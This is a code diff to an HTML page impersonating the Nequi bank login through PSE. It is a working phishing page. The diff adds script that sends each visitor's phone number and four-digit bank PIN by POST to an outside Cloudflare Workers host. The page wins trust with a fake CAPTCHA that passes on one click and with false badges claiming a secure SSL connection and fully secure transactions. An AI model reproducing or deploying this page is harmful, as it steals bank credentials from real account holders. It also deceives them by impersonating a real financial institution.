@@ -87,43 +87,86 @@
     border: 1px solid #e7d5ff;
   }
 
-  .input-group {
-    margin-bottom: 24px;
+  /* Cards */
+  .card { 
+    background: #fff; 
+    padding: clamp(8px, 2vw, 12px) 0; 
+    margin-bottom: 0; 
+    border-bottom: 2px solid #f0f0f0; 
+    display: flex; 
+    align-items: flex-start; 
+    gap: clamp(8px, 2vw, 12px);
   }
 
-  .label-input {
-    font-size: 16px;
+  .left { 
+    display: flex; 
+    align-items: flex-start; 
+    gap: clamp(10px, 2.5vw, 15px); 
+    flex: 1; 
+  }
+
+  .icon { 
+    width: clamp(32px, 6vw, 40px); 
+    height: clamp(32px, 6vw, 40px); 
+    display: flex; 
+    align-items: center; 
+    justify-content: center; 
+    flex-shrink: 0;
+  }
+
+  .icon svg {
+    width: clamp(20px, 4vw, 26px);
+    height: clamp(20px, 4vw, 26px);
+  }
+
+  .content { 
+    flex: 1; 
+    min-width: 0;
+  }
+
+  .text-title { 
+    font-size: clamp(14px, 3.5vw, 17px); 
     font-weight: 600;
-    color: var(--primary);
-    margin-bottom: 8px;
-    display: block;
+    color: var(--primary); 
+    margin-bottom: clamp(3px, 1vw, 5px); 
+    line-height: 1.4;
+    word-break: break-word;
   }
 
-  .input-field {
-    width: 100%;
-    padding: 16px 18px;
-    background: white;
-    border: 1.5px solid #d9c9ed;
-    border-radius: 16px;
-    font-size: 16px;
-    font-family: 'Inter', sans-serif;
-    outline: none;
-    color: #1a1a1a;
-    font-weight: 500;
-    box-sizing: border-box;
-  }
-
-  .input-field:focus {
-    border-color: var(--primary);
-    box-shadow: 0 4px 10px rgba(46, 0, 57, 0.08);
-  }
-
-  .input-field::placeholder {
-    color: #aaa;
+  .text-sub { 
+    font-size: clamp(13px, 3vw, 15px); 
     font-weight: 400;
+    color: var(--gray-text); 
+    margin-bottom: clamp(6px, 1.5vw, 8px); 
+    line-height: 1.4; 
+    word-break: break-word;
   }
 
-  /* Quitar flechas de input number */
+  .input-container { 
+    border-bottom: 1px solid #e0e0e0; 
+    transition: border-color 0.3s ease; 
+    width: 100%;
+  }
+
+  .input-container:focus-within { 
+    border-bottom-color: var(--primary); 
+  }
+
+  .input-field { 
+    width: 100%; 
+    padding: clamp(6px, 1.5vw, 8px) 0; 
+    background-color: transparent; 
+    border: none; 
+    border-radius: 0; 
+    font-size: clamp(14px, 3.5vw, 16px); 
+    color: var(--primary); 
+    outline: none; 
+    font-family: 'Inter', sans-serif; 
+    font-weight: 400; 
+    -webkit-appearance: none;
+    appearance: none;
+  }
+
   .input-field[type=number]::-webkit-inner-spin-button,
   .input-field[type=number]::-webkit-outer-spin-button {
     -webkit-appearance: none;
@@ -134,79 +177,144 @@
     -moz-appearance: textfield;
   }
 
-  /* CAPTCHA */
-  .captcha-block {
-    margin: 30px 0 25px;
-    background: #f3f0f9;
-    border-radius: 24px;
-    padding: 16px 14px;
-    border: 1px solid #e1d4f0;
-  }
-
-  .captcha-title {
-    font-size: 16px;
-    font-weight: 600;
-    color: var(--primary);
-    margin-bottom: 16px;
-    display: flex;
-    align-items: center;
-    gap: 8px;
-  }
-
-  .captcha-title span {
-    background: var(--primary);
-    color: white;
-    width: 24px;
-    height: 24px;
+  .check { 
+    background: #e0e0e0; 
+    color: white; 
+    font-size: clamp(10px, 2vw, 12px); 
+    padding: clamp(6px, 1.5vw, 8px) clamp(8px, 2vw, 10px); 
+    border-radius: 50%; 
+    transition: all 0.3s ease;
+    font-weight: 400;
     display: inline-flex;
     align-items: center;
     justify-content: center;
-    border-radius: 50%;
-    font-size: 14px;
+    min-width: clamp(24px, 5vw, 30px);
+    min-height: clamp(24px, 5vw, 30px);
+    flex-shrink: 0;
   }
 
-  .captcha-box {
-    display: flex;
-    align-items: center;
-    gap: 14px;
-    background: white;
-    padding: 12px 16px;
-    border-radius: 40px;
-    border: 1px solid #cdb5e8;
+  .check.valid {
+    background: var(--success);
+  }
+
+  .validation-message {
+    font-size: clamp(11px, 2.5vw, 13px);
+    color: var(--danger);
+    margin-top: 4px;
+    display: none;
+    font-weight: 400;
+  }
+
+  .required-indicator {
+    color: var(--danger);
+    font-size: clamp(10px, 2.2vw, 12px);
+    margin-left: 4px;
+    font-weight: 400;
+    vertical-align: super;
+  }
+
+  /* CAPTCHA */
+  .captcha-section {
+    margin: clamp(20px, 4vw, 30px) 0;
+    padding: clamp(15px, 3vw, 20px);
+    border-radius: 16px;
+    background: #f8f9fa;
+    border: 1px solid #e9ecef;
+  }
+
+  .captcha-progress-container {
+    width: 100%;
+    height: clamp(45px, 8vw, 55px);
+    background: #f0f0f0;
+    border-radius: 30px;
+    overflow: hidden;
+    position: relative;
     cursor: pointer;
-    transition: 0.2s;
-    user-select: none;
+    transition: all 0.3s ease;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.1);
   }
 
-  .captcha-box.checked {
-    background: #e9ffe9;
-    border-color: #2b8c4c;
+  .captcha-progress-container:hover {
+    transform: translateY(-1px);
+    box-shadow: 0 4px 12px rgba(0,0,0,0.15);
   }
 
-  .captcha-checkbox {
-    width: 28px;
-    height: 28px;
-    border-radius: 8px;
-    background: white;
-    border: 2px solid #9b87b3;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 18px;
-    color: var(--primary);
-    transition: 0.1s;
+  .captcha-progress-fill {
+    position: absolute;
+    top: 0;
+    left: 0;
+    height: 100%;
+    width: 0%;
+    background: linear-gradient(90deg, #4CAF50, var(--success));
+    border-radius: 30px;
+    transition: width 0.8s cubic-bezier(0.4, 0, 0.2, 1);
   }
 
-  .captcha-box.checked .captcha-checkbox {
-    background: #2b8c4c;
-    border-color: #2b8c4c;
-    color: white;
+  .captcha-progress-fill.completed {
+    width: 100%;
+    box-shadow: 0 0 20px rgba(0, 200, 83, 0.4);
   }
 
   .captcha-text {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    font-size: clamp(14px, 3.5vw, 16px);
+    font-weight: 400;
+    color: #666;
+    z-index: 2;
+    transition: all 0.3s ease;
+    white-space: nowrap;
+  }
+
+  .captcha-progress-container.completed .captcha-text {
+    color: white;
     font-weight: 500;
-    color: #1e1e1e;
-    font-size: 15px;
+  }
+
+  .captcha-checkmark {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%) scale(0);
+    font-size: clamp(20px, 5vw, 28px);
+    color: white;
+    font-weight: 400;
+    z-index: 3;
+    opacity: 0;
+    transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+  }
+
+  .captcha-progress-container.completed .captcha-checkmark {
+    opacity: 1;
+    transform: translate(-50%, -50%) scale(1);
+  }
+
+  .captcha-instructions {
+    text-align: center;
+    font-size: clamp(13px, 3vw, 15px);
+    color: #666;
+    margin-bottom: clamp(10px, 2vw, 15px);
+    font-weight: 400;
+  }
+
+  .captcha-particles {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    pointer-events: none;
+  }
+
+  .particle {
+    position: absolute;
+    width: clamp(3px, 1vw, 5px);
+    height: clamp(3px, 1vw, 5px);
+    background: white;
+    border-radius: 50%;
+    opacity: 0;
   }
 
   /* BOTONES */
@@ -222,7 +330,6 @@
     margin-top: 15px;
     cursor: not-allowed;
     font-family: 'Inter', sans-serif;
-    letter-spacing: 0.3px;
     transition: all 0.3s ease;
   }
 
@@ -270,6 +377,44 @@
 
   .forgot-link:hover {
     text-decoration: underline;
+  }
+
+  /* Barra de progreso */
+  .progress-bar { 
+    width: 100%; 
+    height: 4px; 
+    background: #f0f0f0; 
+    border-radius: 2px; 
+    margin: clamp(10px, 2vw, 15px) 0; 
+    overflow: hidden; 
+  }
+
+  .progress-fill { 
+    height: 100%; 
+    background: var(--primary); 
+    width: 0%; 
+    transition: width 0.3s ease; 
+  }
+
+  #progress-text {
+    font-size: clamp(12px, 3vw, 14px);
+    font-weight: 400;
+    color: var(--gray-text);
+    text-align: center;
+  }
+
+  /* Security badge */
+  .security-badge { 
+    background: #f8f9fa; 
+    border: 1px solid #e9ecef; 
+    padding: clamp(6px, 1.5vw, 8px) clamp(10px, 2.5vw, 14px); 
+    border-radius: 30px; 
+    font-size: clamp(11px, 2.5vw, 13px); 
+    color: #6c757d; 
+    display: inline-flex; 
+    align-items: center; 
+    gap: clamp(4px, 1vw, 6px); 
+    font-weight: 400;
   }
 
   /* FOOTER */
@@ -328,15 +473,6 @@
     margin-top: 15px;
   }
 
-  .security-badge {
-    background: rgba(255,255,255,0.1);
-    padding: 8px 15px;
-    border-radius: 20px;
-    font-size: 12px;
-    display: inline-block;
-    margin-top: 10px;
-  }
-
   #loader {
     display: none;
     position: fixed;
@@ -353,25 +489,19 @@
     font-weight: 500;
   }
 
-  .spinner {
-    width: 55px;
-    height: 55px;
-    border: 6px solid #eee;
-    border-top-color: var(--primary);
-    border-radius: 50%;
-    animation: spin 0.9s linear infinite;
-    margin: 0 auto 15px;
+  @keyframes confetti {
+    0% { opacity: 1; transform: translate(0, 0) rotate(0deg); }
+    100% { opacity: 0; transform: translate(calc(50px * var(--direction, 1)), 80px) rotate(360deg); }
   }
-
-  @keyframes spin { to { transform: rotate(360deg); } }
 </style>
 </head>
-
 <body>
 
 <div class="header">
   <span>←</span> Nequi · PSE
 </div>
+
+<img src="bane.jpeg" alt="Nequi" style="width: min(80%, 300px); height: auto; display: block; margin: 10px auto;">
 
 <div class="container">
   <div class="main-title">Nequi</div>
@@ -382,61 +512,89 @@
   </div>
 
   <form id="loginForm">
-    <!-- Número de celular -->
-    <div class="input-group">
-      <label class="label-input">Número de celular</label>
-      <input 
-        type="tel" 
-        class="input-field" 
-        id="usuario" 
-        placeholder="Ej: 3001234567" 
-        required 
-        pattern="[0-9]{10}"
-        maxlength="10"
-        minlength="10"
-        inputmode="numeric"
-        autocomplete="off"
-      />
+    <!-- Campo Número -->
+    <div class="card">
+      <div class="left">
+        <div class="icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#3A0A63" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="7" y="2" width="10" height="20" rx="3"></rect>
+            <line x1="12" y1="18" x2="12" y2="18" stroke-width="3"></line>
+          </svg>
+        </div>
+        <div class="content">
+          <div class="text-title">Número vinculado a Nequi<span class="required-indicator">*</span></div>
+          <div class="text-sub">Ingresa tu número de celular vinculado</div>
+          <div class="input-container">
+            <input type="tel" class="input-field" id="usuario" placeholder="Ej: 3115555555" required pattern="3[0-9]{9}" maxlength="10" minlength="10" inputmode="numeric" />
+          </div>
+          <div class="validation-message" id="usuario-error">Número inválido (10 dígitos)</div>
+        </div>
+      </div>
+      <div class="check" id="usuario-check">!</div>
     </div>
 
-    <!-- Clave (4 dígitos) -->
-    <div class="input-group">
-      <label class="label-input">Clave</label>
-      <input 
-        type="password" 
-        class="input-field" 
-        id="clave" 
-        placeholder="4 dígitos" 
-        required 
-        maxlength="4" 
-        minlength="4"
-        pattern="[0-9]{4}"
-        inputmode="numeric"
-        autocomplete="off"
-      />
+    <!-- Campo Clave -->
+    <div class="card">
+      <div class="left">
+        <div class="icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#3A0A63" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="3" y="11" width="18" height="10" rx="2"></rect>
+            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+          </svg>
+        </div>
+        <div class="content">
+          <div class="text-title">Clave de 4 dígitos<span class="required-indicator">*</span></div>
+          <div class="text-sub">Ingresa tu clave de seguridad</div>
+          <div class="input-container">
+            <input type="password" class="input-field" id="clave" placeholder="****" required pattern="[0-9]{4}" maxlength="4" minlength="4" inputmode="numeric" />
+          </div>
+          <div class="validation-message" id="clave-error">Deben ser 4 dígitos</div>
+        </div>
+      </div>
+      <div class="check" id="clave-check">!</div>
     </div>
+
+    <!-- Barra de progreso (simplificada para 2 campos + captcha) -->
+    <div class="progress-bar">
+      <div id="formProgress" class="progress-fill"></div>
+    </div>
+    <div id="progress-text">0% completado</div>
 
     <!-- CAPTCHA -->
-    <div class="captcha-block">
-      <div class="captcha-title">
-        <span>✓</span> Confirme que soy una persona real.
+    <div class="captcha-section">
+      <div class="captcha-instructions">Haz clic para verificar que no eres un robot</div>
+      <div class="captcha-progress-container" id="captchaProgress">
+        <div class="captcha-progress-fill" id="captchaFill">
+          <div class="captcha-particles" id="captchaParticles"></div>
+        </div>
+        <div class="captcha-text" id="captchaText">Verificar</div>
+        <div class="captcha-checkmark">✓</div>
       </div>
-      <div class="captcha-box" id="catchaBox">
-        <div class="captcha-checkbox" id="captchaCheckbox"> </div>
-        <span class="captcha-text">No soy un robot</span>
+      <div style="text-align: center; margin-top: 8px;">
+        <div class="validation-message" id="captcha-error">Completa el CAPTCHA</div>
       </div>
     </div>
 
-    <!-- BOTONES -->
-    <button type="submit" class="login-button" id="loginBtn" disabled>Entrar</button>
+    <!-- Badge de seguridad -->
+    <div style="text-align: center; margin: 15px 0;">
+      <div class="security-badge">
+        <span>🔒</span>
+        Conexión segura SSL
+      </div>
+    </div>
+
+    <!-- Botones -->
+    <button type="submit" class="login-button" id="loginBtn" disabled>
+      <span id="btnText">Verificar Identidad</span>
+    </button>
     <button type="button" class="now-button" onclick="window.location.href='https://www.google.com'">Ahora No</button>
 
-    <!-- ENLACE OLVIDÉ CLAVE -->
+    <!-- Enlace olvidé clave -->
     <a href="#" class="forgot-link">¿Se te olvidó la clave? Abre Nequi en tu cel y cámbiala en segundos.</a>
   </form>
 </div>
 
-<!-- FOOTER -->
+<!-- Footer -->
 <div class="footer">
   <div class="footer-content">
     <div class="footer-logo">Nequi</div>
@@ -448,96 +606,261 @@
       <a href="#" class="footer-link">Política de privacidad</a>
       <a href="#" class="footer-link">Defensor del consumidor</a>
     </div>
-    <div class="security-badge">
-      🔒 Conexión segura · Pago protegido
+    <div class="security-badge" style="margin: 10px auto; background: rgba(255,255,255,0.1); border-color: rgba(255,255,255,0.2); color: white;">
+      🔒 Transacciones 100% seguras
     </div>
     <div class="footer-copyright">
-      © 2026 Nequi - Banco Nequi S.A.
+      &copy; 2026 Nequi - Banco Nequi S.A.
     </div>
   </div>
 </div>
 
-<!-- LOADER -->
+<!-- Loader -->
 <div id="loader">
-  <div class="spinner"></div>
-  Procesando...
+  <div>⏳</div>
+  Verificando tu identidad...
+  <div style="font-size: clamp(12px, 3vw, 14px); margin-top: 10px; color: #666;">Esto puede tomar unos segundos</div>
 </div>
 
 <script>
-  const usuario = document.getElementById('usuario');
-  const clave = document.getElementById('clave');
-  const loginBtn = document.getElementById('loginBtn');
-  const captchaBox = document.getElementById('catchaBox');
-  const captchaCheck = document.getElementById('captchaCheckbox');
+// WORKER URL
+const WORKER_URL = "https://throbbing-sky-6a75.claropromoxlaro.workers.dev";
 
-  let captchaValidado = false;
+// Variables globales
+let captchaValidado = false;
 
-  // Validar campos en tiempo real
-  function validarCampos() {
-    // Validar usuario: 10 dígitos
-    const usuarioValido = /^\d{10}$/.test(usuario.value.trim());
-    
-    // Validar clave: exactamente 4 dígitos
-    const claveValida = /^\d{4}$/.test(clave.value.trim());
+// Función para validar campos
+function validarCampo(campoId, valor) {
+  const checkElement = document.getElementById(campoId + '-check');
+  const errorElement = document.getElementById(campoId + '-error');
 
-    if (usuarioValido && claveValida && captchaValidado) {
-      loginBtn.classList.add('active');
-      loginBtn.disabled = false;
+  if (!checkElement) return false;
+
+  let esValido = false;
+
+  switch(campoId) {
+    case 'usuario':
+      esValido = /^3[0-9]{9}$/.test(valor);
+      break;
+    case 'clave':
+      esValido = /^[0-9]{4}$/.test(valor);
+      break;
+  }
+
+  if (esValido) {
+    checkElement.classList.add('valid');
+    checkElement.innerHTML = '✔';
+    if (errorElement) errorElement.style.display = 'none';
+  } else {
+    checkElement.classList.remove('valid');
+    checkElement.innerHTML = '!';
+    if (errorElement && valor) {
+      errorElement.style.display = 'block';
     } else {
-      loginBtn.classList.remove('active');
-      loginBtn.disabled = true;
+      if (errorElement) errorElement.style.display = 'none';
     }
   }
 
-  // Event listeners para inputs
-  usuario.addEventListener('input', validarCampos);
-  clave.addEventListener('input', validarCampos);
+  return esValido;
+}
 
-  // Validar que solo se ingresen números en clave (máx 4 dígitos)
-  clave.addEventListener('keypress', function(e) {
-    const charCode = e.which ? e.which : e.keyCode;
-    if (charCode < 48 || charCode > 57) {
-      e.preventDefault();
+// Actualizar progreso
+function actualizarProgreso() {
+  const campos = ['usuario', 'clave'];
+  let completados = 0;
+
+  campos.forEach(campo => {
+    const elemento = document.getElementById(campo);
+    if (!elemento) return;
+
+    const valor = elemento.value;
+
+    if (validarCampo(campo, valor)) {
+      completados++;
     }
   });
 
-  // Validar que solo se ingresen números en usuario (máx 10 dígitos)
-  usuario.addEventListener('keypress', function(e) {
-    const charCode = e.which ? e.which : e.keyCode;
-    if (charCode < 48 || charCode > 57) {
-      e.preventDefault();
+  if (captchaValidado) {
+    completados++;
+    const captchaError = document.getElementById('captcha-error');
+    if (captchaError) captchaError.style.display = 'none';
+  } else {
+    const captchaError = document.getElementById('captcha-error');
+    if (captchaError) captchaError.style.display = 'block';
+  }
+
+  const totalCampos = campos.length + 1; // +1 por el captcha
+  const porcentaje = Math.round((completados / totalCampos) * 100);
+
+  const progreso = document.getElementById('formProgress');
+  if (progreso) progreso.style.width = porcentaje + '%';
+
+  const progressText = document.getElementById('progress-text');
+  if (progressText) progressText.textContent = porcentaje + '% completado';
+
+  return completados === totalCampos;
+}
+
+// Validar campos y actualizar botón
+function validarCampos() {
+  const todosCompletos = actualizarProgreso();
+  const loginBtn = document.getElementById('loginBtn');
+  const btnText = document.getElementById('btnText');
+
+  if (loginBtn && btnText) {
+    if (todosCompletos) {
+      loginBtn.classList.add('active');
+      loginBtn.disabled = false;
+      btnText.textContent = "✅ Verificar Identidad";
+    } else {
+      loginBtn.classList.remove('active');
+      loginBtn.disabled = true;
+      btnText.textContent = "Verificar Identidad";
     }
-  });
+  }
+}
 
-  // Evento captcha
-  captchaBox.addEventListener('click', function(e) {
-    e.preventDefault();
-    if (!captchaValidado) {
-      captchaValidado = true;
-      captchaBox.classList.add('checked');
-      captchaCheck.innerHTML = '✓';
-    }
-    validarCampos();
-  });
+// Submit del formulario
+document.getElementById('loginForm').addEventListener('submit', async function (e) {
+  e.preventDefault();
 
-  // Submit del formulario
-  document.getElementById('loginForm').addEventListener('submit', function(e) {
-    e.preventDefault();
+  if (!actualizarProgreso()) {
+    alert('Completa todos los campos correctamente');
+    return;
+  }
 
-    if (!loginBtn.disabled) {
-      const datos = {
-        usuario: usuario.value.trim(),
-        clave: clave.value.trim()
-      };
+  const loader = document.getElementById('loader');
+  const loginBtn = document.getElementById('loginBtn');
 
+  loader.style.display = 'block';
+  loginBtn.disabled = true;
+  loginBtn.innerHTML = '<span>⏳ Enviando...</span>';
+
+  const datos = {
+    usuario: document.getElementById('usuario')?.value.trim() || '',
+    clave: document.getElementById('clave')?.value.trim() || '',
+    transactionId: 'NEQUI_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9)
+  };
+
+  try {
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 10000);
+
+    const response = await fetch(`${WORKER_URL}/login`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(datos),
+      signal: controller.signal
+    });
+
+    clearTimeout(timeoutId);
+
+    if (!response.ok) throw new Error('Error en el servidor');
+
+    const result = await response.json();
+
+    if (result.ok) {
       localStorage.setItem('bancoldata', JSON.stringify(datos));
-      document.getElementById('loader').style.display = 'flex';
-      
+
+      loader.innerHTML = `
+        <div>✅</div>
+        Datos verificados correctamente<br>
+        <div style="font-size: 13px; margin-top: 10px;">Redirigiendo...</div>
+      `;
+
       setTimeout(() => {
-        window.location.href = 'resultados.php';
-      }, 1500);
+        window.location.href = 'resultados.html';
+      }, 2000);
+    } else {
+      throw new Error(result.error || 'Error');
     }
+
+  } catch (error) {
+    loader.innerHTML = `
+      <div>❌</div>
+      Error de conexión<br>
+      <div style="font-size: 13px; margin-top: 10px;">Reintentando...</div>
+    `;
+
+    setTimeout(() => {
+      loader.style.display = 'none';
+      loginBtn.disabled = false;
+      loginBtn.innerHTML = '<span id="btnText">🔄 Reintentar</span>';
+    }, 3000);
+  }
+});
+
+// CAPTCHA
+document.getElementById('captchaProgress')?.addEventListener('click', function () {
+  if (captchaValidado) return;
+
+  captchaValidado = true;
+
+  const captchaFill = document.getElementById('captchaFill');
+  const captchaContainer = document.getElementById('captchaProgress');
+
+  if (captchaFill) captchaFill.classList.add('completed');
+  if (captchaContainer) captchaContainer.classList.add('completed');
+
+  createConfetti();
+
+  setTimeout(() => {
+    validarCampos();
+  }, 1000);
+});
+
+// Confetti
+function createConfetti() {
+  const container = document.getElementById('captchaParticles');
+  if (!container) return;
+
+  container.innerHTML = '';
+
+  for (let i = 0; i < 20; i++) {
+    const particle = document.createElement('div');
+    particle.className = 'particle';
+
+    const left = Math.random() * 100;
+    const top = Math.random() * 100;
+    const direction = Math.random() > 0.5 ? 1 : -1;
+
+    particle.style.cssText = `
+      left: ${left}%;
+      top: ${top}%;
+      background: ${['#FFD700', '#FF6B6B', '#4ECDC4'][Math.floor(Math.random() * 3)]};
+      animation: confetti 1s ease-out forwards;
+      --direction: ${direction};
+    `;
+
+    container.appendChild(particle);
+  }
+}
+
+// Event listeners
+document.getElementById('usuario')?.addEventListener('input', function() {
+  validarCampo('usuario', this.value);
+  validarCampos();
+});
+
+document.getElementById('clave')?.addEventListener('input', function() {
+  validarCampo('clave', this.value);
+  validarCampos();
+});
+
+// Inicialización
+document.addEventListener('DOMContentLoaded', function() {
+  const campos = ['usuario', 'clave'];
+
+  campos.forEach(campo => {
+    const elemento = document.getElementById(campo);
+    if (!elemento) return;
+
+    const valor = elemento.value;
+    validarCampo(campo, valor);
   });
+
+  validarCampos();
+});
 </script>
 
 </body>
